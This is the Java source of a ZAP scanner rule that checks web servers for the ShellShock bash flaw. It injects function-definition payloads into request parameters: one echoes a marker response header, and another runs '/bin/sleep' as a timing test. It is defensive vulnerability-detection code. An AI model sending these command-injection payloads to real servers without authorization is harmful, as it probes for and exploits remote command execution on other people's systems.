/*
 * Zed Attack Proxy (ZAP) and its related class files.
 *
 * ZAP is an HTTP/HTTPS proxy for assessing web application security.
 *
 * Copyright 2014 The ZAP Development Team
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.zaproxy.zap.extension.ascanrulesBeta;

import java.util.List;
import org.apache.commons.configuration.ConversionException;
import org.apache.log4j.Logger;
import org.parosproxy.paros.Constant;
import org.parosproxy.paros.core.scanner.AbstractAppParamPlugin;
import org.parosproxy.paros.core.scanner.Alert;
import org.parosproxy.paros.core.scanner.Category;
import org.parosproxy.paros.core.scanner.Plugin;
import org.parosproxy.paros.network.HttpMessage;
import org.zaproxy.zap.extension.ruleconfig.RuleConfigParam;

/**
 * a scan rule that looks for servers vulnerable to ShellShock
 *
 * @author psiinon
 */
public class ShellShockScanRule extends AbstractAppParamPlugin {

    /** the logger object */
    private static final Logger log = Logger.getLogger(ShellShockScanRule.class);

    private final String attackHeader = "X-Powered-By";

    // Use a standard HTTP response header, to make sure the header is not dropped by load
    // balancers, proxies, etc
    private final String evidence = "ShellShock-Vulnerable";

    private int sleep = 5;

    @Override
    public int getId() {
        return 10048;
    }

    @Override
    public String getName() {
        return Constant.messages.getString("ascanbeta.shellshock.name");
    }

    @Override
    public String getDescription() {
        return Constant.messages.getString("ascanbeta.shellshock.desc");
    }

    @Override
    public int getCategory() {
        return Category.SERVER;
    }

    @Override
    public String getSolution() {
        return Constant.messages.getString("ascanbeta.shellshock.soln");
    }

    @Override
    public String getReference() {
        return Constant.messages.getString("ascanbeta.shellshock.ref");
    }

    @Override
    public void init() {
        // Read the sleep value from the configs
        try {
            this.sleep = this.getConfig().getInt(RuleConfigParam.RULE_COMMON_SLEEP_TIME, 5);
        } catch (ConversionException e) {
            log.debug(
                    "Invalid value for 'rules.common.sleep': "
                            + this.getConfig().getString(RuleConfigParam.RULE_COMMON_SLEEP_TIME));
        }
        if (log.isDebugEnabled()) {
            log.debug("Sleep set to " + sleep + " seconds");
        }
    }

    @Override
    public void scan(HttpMessage origMsg, String paramName, String paramValue) {
        try {
            // First try a simple reflected attack
            // With CGI, the evidence will come out in the header
            HttpMessage msg1 = getNewMsg();
            String attack = "() { :;}; echo '" + attackHeader + ": " + evidence + "'";

            setParameter(msg1, paramName, attack);
            sendAndReceive(msg1, false); // do not follow redirects

            List<String> ssHeaders = msg1.getResponseHeader().getHeaderValues(attackHeader);
            if (!ssHeaders.isEmpty()) {
                for (String header : ssHeaders) {
                    if (header.contains(evidence)) {
                        newAlert()
                                .setConfidence(Alert.CONFIDENCE_MEDIUM)
                                .setParam(paramName)
                                .setAttack(attack)
                                .setOtherInfo(
                                        Constant.messages.getString(
                                                "ascanbeta.shellshock.extrainfo"))
                                .setEvidence(evidence)
                                .setMessage(msg1)
                                .raise();
                        return;
                    }
                }
            }

            // Then a timing attack
            // With PHP, the evidence will come out in the body (this will be caught by the timing
            // based attack)
            boolean vulnerable = false;
            HttpMessage msg2 = getNewMsg();
            attack = "() { :;}; /bin/sleep " + sleep;

            setParameter(msg2, paramName, attack);
            sendAndReceive(msg2, false); // do not follow redirects
            long attackElapsedTime = msg2.getTimeElapsedMillis();

            if (attackElapsedTime > sleep * 1000) {
                vulnerable = true;
                if (!Plugin.AlertThreshold.LOW.equals(this.getAlertThreshold())
                        && attackElapsedTime > 6000) {
                    // Could be that the server is overloaded, try a safe request
                    HttpMessage safeMsg = getNewMsg();
                    sendAndReceive(safeMsg, false); // do not follow redirects
                    if (safeMsg.getTimeElapsedMillis() > sleep * 1000
                            && (safeMsg.getTimeElapsedMillis() - attackElapsedTime)
                                    < sleep * 1000) {
                        // Looks like the server is just overloaded
                        vulnerable = false;
                    }
                }
            }
            if (vulnerable) {
                newAlert()
                        .setConfidence(Alert.CONFIDENCE_MEDIUM)
                        .setParam(paramName)
                        .setAttack(attack)
                        .setOtherInfo(Constant.messages.getString("ascanbeta.shellshock.extrainfo"))
                        .setEvidence(
                                Constant.messages.getString(
                                        "ascanbeta.shellshock.timingbased.evidence",
                                        attackElapsedTime))
                        .setMessage(msg2)
                        .raise();
                return;
            }

        } catch (Exception e) {
            log.error("Error scanning a Host for ShellShock: " + e.getMessage(), e);
        }
    }

    @Override
    public int getRisk() {
        return Alert.RISK_HIGH;
    }

    @Override
    public int getCweId() {
        return 78; // Improper Neutralization of Special Elements used in an OS Command ('OS Command
        // Injection')
    }

    @Override
    public int getWascId() {
        return 31; // OS Commanding
    }
}
